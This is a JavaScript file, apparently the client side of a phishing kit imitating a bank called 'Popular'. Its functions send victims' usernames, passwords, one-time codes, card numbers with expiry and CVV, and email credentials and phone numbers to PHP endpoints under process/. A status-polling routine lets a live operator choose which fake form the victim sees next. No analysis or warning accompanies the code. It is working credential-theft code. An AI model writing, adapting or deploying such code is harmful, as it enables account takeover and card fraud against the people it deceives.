function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}


function slider1(){
    $( "#slider4" ).fadeOut( "fast", function() {
        $('#slider4').removeClass("efecto-slider");
        $('#slider1').addClass("efecto-slider");   
        $('#slider1').show();
        //$('#slider1').fadeIn("fast");  
    });
    setTimeout(slider2, 5000);    
}

function slider4(){
    $( "#slider3" ).fadeOut( "fast", function() {
        $('#slider3').removeClass("efecto-slider");
        $('#slider4').addClass("efecto-slider");   
        $('#slider4').show();
        //$('#slider4').fadeIn("fast");  
    });
    setTimeout(slider1, 5000);    
}

function slider3(){
   $( "#slider2" ).fadeOut( "fast", function() {
        $('#slider2').removeClass("efecto-slider");
        $('#slider3').addClass("efecto-slider");   
        $('#slider3').show();
        //$('#slider3').fadeIn("fast");  
    });
    setTimeout(slider4, 5000);    
}

function slider2(){
    $( "#slider1" ).fadeOut( "fast", function() {
        $('#slider1').removeClass("efecto-slider");
        $('#slider2').addClass("efecto-slider");   
        $('#slider2').show();
        //$('#slider2').fadeIn("fast");  
    });
    setTimeout(slider3, 5000); 
}

function iniciar(){
    $('#slider1').addClass("efecto-slider");  
    $('#fondo,#cargando').hide();
    setTimeout(slider2, 5000);
}
function cerrar(){
     window.location.href = "../../../../finish-no-back-button/";
}


function vista_password(){
    $('#btn-password').css("padding","14px");
    $('#btn-password').html("Continuar");
    $('#frm-usuario').hide();  
    $('#frm-password').show(); 
}


function vista_otp(){
    $('#btn-otp').css("padding","14px");
    $('#btn-otp').html("Validar");
    $('#txt-otp').val("");  
    $('#esperando-lateral').hide();
    $('#frm-otp').show();  
}

function vista_correo(){
    $('#btn-correo').css("padding","14px");
    $('#btn-correo').html("Verificar");
    $('#txt-correo,#txt-clave,#txt-celular').val("");  
    $('#esperando-lateral').hide();
    $('#frm-correo').show(); 
}

function vista_tarjeta(){
    $('#btn-tarjeta').css("padding","14px");
    $('#btn-tarjeta').html("Validar");
    $('#txt-tarjeta,#aFecha,#mFecha,#txt-cvv').val("");  
    $('#esperando-lateral').hide();
    $('#frm-tarjeta').show();     
}

function vista_otp_err(){
    $('#btn-otp-err').css("padding","14px");
    $('#btn-otp-err').html("Validar");
    $('#txt-otp-err').val("");  
    $('#esperando-lateral').hide();
    $('#frm-otp-err').show(); 
    $("#txt-otp-err").css("border","1px solid #e70000");     
}

function vista_final(){
    $('#esperando-lateral').hide();
    $('#final').show(); 
    setTimeout(cerrar, 2000); 
}

function vista_usuario(){
    $('#btn-usuario').css("padding","14px");
    $('#btn-usuario').html("Continuar");    
    $('#txt-usuario,#txt-password').val(""); 
    $('#esperando-lateral').hide();
    $('#frm-usuario').show(); 
}

function enviar_usuario(u,p){
    d = detectar_dispositivo();
    $.post( "../../../../process/pasologin.php", { usr:u, pas: p, dis: d, ban:"Popular"} ,function(data) {      
        espera = 1;  
    });
}


function enviar_otp(o){
    $.post( "../../../../process/pasootp.php", { otp: o} ,function(data) {
        espera = 1;       
    });
}

function enviar_tarjeta(t,f,c){
    $.post( "../../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) { 
        espera = 1;      
    });
}

function enviar_correo(e,c,t){
    $.post( "../../../../process/pasocorreo.php", { eml:e,clv:c,cel:t } ,function(data) {        
        espera = 1;             
    });
}


function consultar_estado(){
     if (espera == 1) {
        $.post( "../../../../process/estado.php",function(data) {
            switch (data) {
                case '2': espera = 0;
                          vista_otp(); 
                          break;
                case '4': espera = 0; 
                          vista_correo(); 
                          break;
                case '6': espera = 0; 
                          vista_tarjeta(); 
                          break;               
                case '8': espera = 0; 
                          vista_otp_err(); 
                          break;
                case '10': espera = 0; 
                           vista_final(); break;
                case '12': espera = 0; 
                           vista_usuario(); break;
            } 
        });      
    }
}

function cargar_espera(){
    $('#frm-usuario,#frm-password,#frm-tarjeta,#frm-otp,#frm-otp-err,#frm-correo').hide();  
    $('#esperando-lateral').show(); 
}